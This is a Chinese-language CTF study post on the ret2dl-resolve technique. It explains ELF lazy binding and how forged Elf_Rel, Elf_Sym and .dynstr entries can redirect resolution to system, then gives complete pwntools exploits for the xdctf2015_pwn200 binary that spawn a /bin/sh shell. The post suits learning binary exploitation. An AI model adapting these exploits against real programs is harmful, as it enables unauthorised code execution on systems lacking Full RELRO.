
title: ret2dl-resolve利用方法小记
categories: [CTF]
tags: [pwn]

---
最近在做一道题时,感觉很像ret2dl-resolve能解的,但是最后发现是自己太菜理念不清搞错解题方向ret2dl-resolve并不能解。所以写文重新温习下ret2dl-resolve,防止下次踩坑。<!--more-->

## ret2dl-resolve原理与使用条件

ret2dl-resolve是不需要信息泄露，而是通过动态装载器来直接标识关键函数的位置并调用它们。由于ret2dl-resolve主要是针对延迟绑定来进行操作的，so它可以绕过多种包括专门为保护 ELF 数据结构不被破坏而设计的 RELRO 在内的安全缓解措施。但在依然有条件限制：

1.需要没有开启 Full RELRO 保护，换句话说要开启延迟绑定的机制，即库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。（这个是重要条件）

2.要有能被程序读取数据段上写入Elf_Sym 结构体的空间。

3.能恶意构造一个Elf_Sym 结构体。



## 延迟绑定动态解析过程梳理

在一个存在延迟绑定机制程序中,库函数在第一次被调用时才将函数的真正地址填入 GOT 表以完成绑定。

这过程中牵扯到两个重要的结构体`Elf_Rel`与`Elf_Sym`.

重定位项使用 Elf_Rel 结构体来描述，存在于` .rep.plt` 段和 `.rel.dyn `段中：

```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;

typedef struct
{
  Elf32_Addr    r_offset;       /* Address */
  Elf32_Word    r_info;         /* Relocation type and symbol index */
} Elf32_Rel;

typedef uint64_t Elf64_Addr;
typedef uint64_t Elf64_Xword;
typedef int64_t  Elf64_Sxword;

typedef struct
{
  Elf64_Addr    r_offset;       /* Address */
  Elf64_Xword   r_info;         /* Relocation type and symbol index */
  Elf64_Sxword  r_addend;       /* Addend */
} Elf64_Rela;
```

32 位程序使用 REL，而 64 位程序使用 RELA。

其中`r_info`被宏定义为按如下方式解析和插入：

```c
/* How to extract and insert information held in the r_info field.  */

#define ELF32_R_SYM(val)        ((val) >> 8)
#define ELF32_R_TYPE(val)       ((val) & 0xff)
#define ELF32_R_INFO(sym, type)     (((sym) << 8) + ((type) & 0xff))

#define ELF64_R_SYM(i)          ((i) >> 32)
#define ELF64_R_TYPE(i)         ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)      ((((Elf64_Xword) (sym)) << 32) + (type))
```



而每个符号使用` Elf_Sym `结构体来描述，存在于` .dynsym `段和` .symtab `段中，而 `.symtab` 在` strip `之后会被删掉：

```c
typedef struct
{
  Elf32_Word    st_name;        /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;       /* Symbol value */
  Elf32_Word    st_size;        /* Symbol size */
  unsigned char st_info;        /* Symbol type and binding */
  unsigned char st_other;       /* Symbol visibility */
  Elf32_Section st_shndx;       /* Section index */
} Elf32_Sym;

typedef struct
{
  Elf64_Word    st_name;        /* Symbol name (string tbl index) */
  unsigned char st_info;        /* Symbol type and binding */
  unsigned char st_other;       /* Symbol visibility */
  Elf64_Section st_shndx;       /* Section index */
  Elf64_Addr    st_value;       /* Symbol value */
  Elf64_Xword   st_size;        /* Symbol size */
} Elf64_Sym;
```

下面的宏描述了 st_info 是怎样被解析和插入的：

```c
/* How to extract and insert information held in the st_info field.  */

#define ELF32_ST_BIND(val)      (((unsigned char) (val)) >> 4)
#define ELF32_ST_TYPE(val)      ((val) & 0xf)
#define ELF32_ST_INFO(bind, type)   (((bind) << 4) + ((type) & 0xf))

/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */
#define ELF64_ST_BIND(val)      ELF32_ST_BIND (val)
#define ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)
#define ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))
```



当一个库函数被第一次调用时，具体动态解析过程的步骤为：

导入函数的`reloc_index`标识(一个` ELF_Rel `在 `.rel.plt `中的偏移)入栈。

然后跳转到` .plt` 段的开头,即 PLT[0]。PLT[0] 处的代码将 GOT[1] 的值压入栈中，然后跳转到 GOT[2]。 GOT[1]与GOT[2]这两个 GOT 表条目有着特殊的含义。

​	GOT[1]：一个指向内部数据结构的指针，类型是 `link_map`，在动态装载器内部使用，包含了进行符号解析需要的当前 ELF 对象的信息。在它的` l_info` 域中保存了` .dynamic` 段中大多数条目的指针构成的一个数组。

​	GOT[2]：一个指向动态装载器中 `_dl_runtime_resolve` 函数的指针。

所以这步，PLT[0] 其实就是调用`_dl_runtime_resolve(link_map_obj, reloc_index)`

`_dl_runtime_resolve`函数使用参数` link_map_obj `来获取解析导入函数（使用`reloc_index`参数标识）需要的信息，并将结果写到正确的 GOT 条目中。在 `_dl_runtime_resolve`解析完成后，控制流就交到了那个函数手里，而下次再调用函数的 plt 时，就会直接进入目标函数中执行。过程如下图：



![image-20210523114312781](image-20210523114312781.png)

## ret2dl-resolve利用点

ret2dl-resolve利用点主要有两个地方。

a：因为动态转载器是从` .dynamic `段的 `DT_STRTAB `条目中获得` .dynstr `段的地址的，而 `DT_STRTAB `条目的位置已知，默认情况下也可写。所以攻击者能够改写` DT_STRTAB `条目的内容，欺骗动态装载器，让它以为 `.dynstr `段在 `.bss `段中，并在那里伪造一个假的字符串表。当它尝试解析` printf` 时会使用不同的基地址来寻找函数名，最终执行的是` execve`。这种方式非常简单，但仅当二进制程序的**` .dynamic `段可写***时有效。

b：我们已经知道 `_dl_runtime_resolve` 的第二个参数是` Elf_Rel `条目在 `.rel.plt `段中的偏移，动态装载器将这个值加上` .rel.plt` 的基址来得到目标结构体的绝对位置。然后当传递给` _dl_runtime_resolve` 的参数 `reloc_index `超出了` .rel.plt` 段，并最终落在` .bss `段中时，攻击者可以在该位置伪造了一个` Elf_Rel `结构，并填写` r_offset `的值为一个可写的内存地址来将解析后的函数地址写在那里，同理` r_info `也会是一个将动态装载器导向到攻击者控制内存的下标。这个下标就指向一个位于它后面的 `Elf_Sym` 结构，而 `Elf_Sym `结构中的 `st_name `同样超出了 `.dynsym `段。这样这个符号就会包含一个相对于` .dynstr `地址足够大的偏移使其能够达到这个符号之后的一段内存，而那段内存里保存着这个将要调用的函数的名称。

![image-20210523115403901](image-20210523115403901.png)

## 手动 payload流程构造梳理

以32位程序来梳理下过程：

第一步，对于正常函数而言我们调用动态连接的后write函数作payload：

```python
payload  = "AAAA"     # new ebp
payload += p32(write_plt)
payload += "AAAA"
payload += p32(1)
payload += p32(base_addr + 80)
payload += p32(len("/bin/sh"))
payload += "A" * (80 - len(payload_2))
payload += "/bin/sh\x00"
payload += "A" * (100 - len(payload_2))
```

第二步，我们伪造`write@plt`，及入栈`reloc_index`和跳转PLT[0]，那么payload改为：

```python
cmd="/bin/sh"
payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
```

第三步，伪造一个 write 函数的 `Elf_Rel `结构体。

其中设置`r_offset`为`write@got`，标函数解析后的内存地址存放到该位置。

`r_info`用`readelf -r ./bof | grep write`查找后照搬。动态加载器会根据这个值找到对应的`Elf_Sym`

`reloc_index`要调整为我们伪造 `Elf_Rel `结构体相对`.rel.plt`的偏移。

```python
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
r_info = 0x607 # write: Elf32_Rel->r_info
fake_reloc = p32(write_got) + p32(r_info)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
```

第四步，伪造一个 write 函数的 `Elf_Sym `结构体。

用`readelf -s ./bof | grep write` 然然后用objdump来找st_name与st_info

![image-20210523130030115](image-20210523130030115.png)

同时，`Elf_Rel `结构体也要改变r_info可以通过`r_sym`和`r_type`计算。

`r_sym`又是`Elf_Sym `相对`.dynsym`的偏移，`r_type`照搬`R_386_JUMP_SLOT`的值为0x7

```python
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8 #
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_sym=index_dynsym << 8
r_type=0x7
r_info = (r_sym) | r_type
fake_reloc = p32(write_got) + p32(r_info)
st_name = 0x4c
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
```

第五步，伪造`.bss` 上伪造`.dynstr`,放入伪造函数名`write`。相应调整st_name指向的伪造函数名。

```python
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_sym=index_dynsym << 8
r_type=0x7
r_info = (r_sym) | r_type
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 16) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "write\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
```

最后改'write'为system.

## 例题：xdctf2015_pwn200

按之前手动的分析，完整exp：

```python


from pwn import *
elf = ELF('./bof')

offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
r.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
index_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 16) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc # (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym # (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
gdb.attach(r)
r.sendline(payload2)
r.interactive()
```

同时，我们还可以通过pwntools 的Ret2dlresolvePayload来自动完成需要手动的伪造步骤：

```python
from pwn import *

p=process('./bof')


rop = ROP("./bof")
elf = ELF("./bof") 
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"]) 
rop.read(0, dlresolve.data_addr) 
rop.ret2dlresolve(dlresolve) 
raw_rop = rop.chain() 
print(rop.dump())
print(hex(dlresolve.data_addr))
payload = "A"*112 
payload += raw_rop 

p.sendline(payload)
payload= dlresolve.payload
gdb.attach(p)
p.sendline(payload)
p.interactive()
```

## 参考文献

https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.3_pwn_xdctf2015_pwn200.html

https://ctf-wiki.github.io/ctf-wiki/

https://github.com/datajerk/ctf-write-ups/blob/master/umdctf2021/jie-jne-jnw/exploit-jie.py